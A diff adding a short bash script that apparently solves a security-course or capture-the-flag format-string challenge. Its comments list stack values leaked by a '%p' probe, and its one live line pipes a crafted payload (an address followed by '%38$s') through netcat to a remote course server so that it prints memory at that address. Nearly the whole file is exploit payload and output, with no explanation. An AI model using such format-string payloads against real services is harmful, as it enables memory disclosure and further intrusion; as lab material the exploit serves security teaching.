@@ -1,0 +1,50 @@
+#!/bin/bash
+# AAAA
+# 0xf7767181
+# 0xf777aaf0
+# 0xf774d2e8
+# 0x1
+# 0x1
+# (nil)
+# 0xf761087e
+# 0x34
+# 0xf7604ada
+# 0xffbca734
+# 0x804a00c
+# 0x8048290
+# 0x80481e0
+# 0xf7749ac0
+# 0xf760e9f2
+# 0xf7749ac0
+# 0xf75a8a28
+# 0x34
+# 0xf7749000
+# (nil)
+# 0xf7749000
+# (nil)
+# (nil)
+# 0xffbca7f8
+# 0xf776d500
+# 0xffbca7f8
+# 0x64
+# 0xffbca788
+# 0xf767ad43
+# 0xf7749000
+# 0x8048648
+# (nil)
+# 0xffbca788
+# 0x64
+# (nil)
+# 0x9fef008
+# 0xffbca700
+# 
+# 0x41414141
+# 0x70257025
+# 0x70257025
+# 0x70257025
+# 0x70257025
+# 0x70257025
+# 0x70257025
+# 0x70257025
+# python -c 'print "AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\n"' | nc secprog.cs.nctu.edu.tw 10104
+python -c 'print "\x60\xa0\x04\x08%38$s\n"' | nc secprog.cs.nctu.edu.tw 10104
